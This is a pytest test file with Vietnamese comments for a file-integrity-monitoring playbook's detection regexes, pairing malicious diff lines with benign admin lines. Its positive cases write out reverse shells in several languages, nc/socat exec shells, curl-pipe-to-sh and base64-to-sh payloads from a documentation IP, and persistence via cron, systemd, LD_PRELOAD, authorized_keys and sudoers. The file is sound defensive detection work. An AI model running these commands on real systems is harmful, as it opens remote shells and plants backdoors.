"""Biến thể regex tín hiệu FIM của 550 (S_suspicious_diff_content, S_critical_path).

Mỗi họ mẫu có một ca dương (dòng '>' thêm vào) và một ca âm là thao tác quản trị bình thường.
Giá trị diff là chuỗi tổng hợp, không lấy từ lab.
"""
import pytest

import playbooks

ENTRY = playbooks.get_playbook("550")


def _diff_answer(added: str, removed: str = "") -> str | None:
    lines = ["1c1"]
    if removed:
        lines.append(f"< {removed}")
        lines.append("---")
    lines.append(f"> {added}")
    extracted = {"agent.id": "001", "syscheck.path": "/opt/app/x.conf", "full_log": "x",
                 "syscheck.diff": "\n".join(lines)}
    answers = playbooks.normalize_signals({}, ENTRY, extracted)
    return answers["S_suspicious_diff_content"]["rule_answer"]


POSITIVE = {
    "python_socket_connect": "python3 -c 'import socket,os;s=socket.socket();s.connect((\"203.0.113.9\",4444));os.dup2(s.fileno(),0)'",
    "python_pty_spawn": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
    "perl_socket_connect": "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,0);connect(S,sockaddr_in(4444,inet_aton(\"203.0.113.9\")))'",
    "php_fsockopen": "php -r '$s=fsockopen(\"203.0.113.9\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "ruby_tcpsocket": "ruby -rsocket -e 'c=TCPSocket.new(\"203.0.113.9\",4444)'",
    "interpreter_exec_bin_sh": "perl -e 'exec \"/bin/sh -i\";'",
    "nc_e": "nc -e /bin/sh 203.0.113.9 4444",
    "nc_vv_e_after_host": "/usr/bin/nc -v 203.0.113.9 4444 -e /bin/bash",
    "ncat_c": "ncat 203.0.113.9 4444 -c bash",
    "ncat_long_exec": "ncat --exec /bin/sh 203.0.113.9 4444",
    "nc_listener": "nc -lvp 4444",
    "socat_exec": "socat TCP4:203.0.113.9:4444 EXEC:/bin/sh,pty,stderr",
    "mkfifo_nc": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113.9 4444 >/tmp/f",
    "mknod_p_sh": "mknod /tmp/p p; cat /tmp/p | sh | nc 203.0.113.9 4444 > /tmp/p",
    "base64_pipe_sh": "echo ZWNobyBwd25lZA== | base64 -d | sh",
    "base64_decode_pipe_bash": "cat /tmp/payload | base64 --decode | /bin/bash",
    "bash_c_base64_subshell": "bash -c \"$(echo ZWNobyBwd25lZA== | base64 -d)\"",
    "curl_pipe_sh": "curl http://203.0.113.9/x.sh | sh",
    "authorized_keys_sk_ed25519": "sk-ssh-ed25519@openssh.com AAAAGnNrLXNzaC1lZDI1NTE5QG9wZW5zc2guY29t lab@example",
    "authorized_keys_sk_ecdsa": "sk-ecdsa-sha2-nistp256@openssh.com AAAAInNrLWVjZHNhLXNoYTItbmlzdHAyNTZAb3BlbnNzaC5jb20 lab@example",
    "authorized_keys_rsa": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ lab@example",
    "systemd_execstart_tmp": "ExecStart=/tmp/.hidden/agent",
    "systemd_execstartpre_dev_shm": "ExecStartPre=-/dev/shm/prep.sh",
    "systemd_execstart_var_tmp": "ExecStart=@/var/tmp/x run",
    "ld_preload": "Environment=LD_PRELOAD=/tmp/libhook.so",
    "ld_preload_profile": "export LD_PRELOAD=/usr/local/lib/libhook.so",
    "cron_reboot_tmp": "@reboot /tmp/.x/run.sh",
    "cron_reboot_fetch": "@reboot root curl -s http://203.0.113.9/a | sh",
    "sudoers_nopasswd": "lab_nouser ALL=(ALL) NOPASSWD: ALL",
}

NEGATIVE = {
    "sudoers_defaults_env_reset": "Defaults env_reset",
    "sudoers_secure_path": "Defaults secure_path=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin\"",
    "systemd_python_app": "ExecStart=/usr/bin/python3 /opt/app/server.py",
    "systemd_execstart_usr_bin": "ExecStartPre=/usr/bin/install -d /run/app",
    "systemd_tmp_as_argument": "ExecStart=/usr/bin/app --workdir /var/lib/app",
    "cron_apt_update": "0 3 * * * /usr/bin/apt-get update",
    "cron_reboot_admin_script": "@reboot /usr/local/bin/start-monitoring",
    "path_change": "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "word_socket_in_comment": "# the python socket library is not used here, see connection pool docs",
    "python_plain_script": "python3 /opt/app/manage.py migrate",
    "nc_port_check": "nc -z db.internal 5432",
    "nc_port_check_then_curl_cookie": "nc -vz host 22 && curl -c jar.txt https://example.org/",
    "rsync_dash_e": "rsync -e ssh /srv/data backup:/srv/",
    "socat_forwarder": "socat TCP-LISTEN:8080,fork TCP:backend.internal:80",
    "mkfifo_plain": "mkfifo /run/app/control.pipe",
    "base64_decode_to_file": "base64 -d /etc/app/key.b64 > /etc/app/key",
    "bash_c_plain_subshell": "bash -c \"$(date +%F)\"",
    "curl_download_file": "curl -fsSL https://example.org/release.tar.gz -o /tmp/release.tar.gz",
    "ld_so_conf_comment": "# add /usr/local/lib for the preload of nothing",
    "host_key_option": "HostKey /etc/ssh/ssh_host_ed25519_key",
}


@pytest.mark.parametrize("name", sorted(POSITIVE))
def test_positive_added_line_is_flagged(name):
    assert _diff_answer(POSITIVE[name]) == "yes"


@pytest.mark.parametrize("name", sorted(NEGATIVE))
def test_negative_benign_admin_line_is_not_flagged(name):
    assert _diff_answer(NEGATIVE[name]) == "no"


@pytest.mark.parametrize("name", sorted(POSITIVE))
def test_removed_backdoor_line_is_not_flagged(name):
    # Admin gỡ dòng độc: nó chỉ nằm ở dòng '<' → không được báo.
    assert _diff_answer("ExecStart=/usr/bin/true", removed=POSITIVE[name]) == "no"


def test_missing_or_truncated_diff_is_unknown_not_no():
    extracted = {"agent.id": "001", "syscheck.path": "/opt/app/x.conf", "full_log": "x"}
    answers = playbooks.normalize_signals({}, ENTRY, extracted)
    assert answers["S_suspicious_diff_content"]["rule_answer"] is None


@pytest.mark.parametrize("path", [
    "/etc/rc.local", "/etc/profile.d/10-hook.sh", "/root/.bashrc", "/etc/ld.so.preload",
])
def test_new_persistence_paths_match(path):
    answers = playbooks.normalize_signals({}, ENTRY, {"agent.id": "001", "syscheck.path": path, "full_log": "x"})
    assert answers["S_critical_path"]["rule_answer"] == "yes"


@pytest.mark.parametrize("path", [
    "/etc/profile.d/readme.txt", "/etc/rc.local.bak", "/home/alice/.bashrc", "/etc/cups/subscriptions.conf",
    "/etc/profile.d/sub/x.sh",
])
def test_nearby_paths_do_not_match(path):
    answers = playbooks.normalize_signals({}, ENTRY, {"agent.id": "001", "syscheck.path": path, "full_log": "x"})
    assert answers["S_critical_path"]["rule_answer"] == "no"
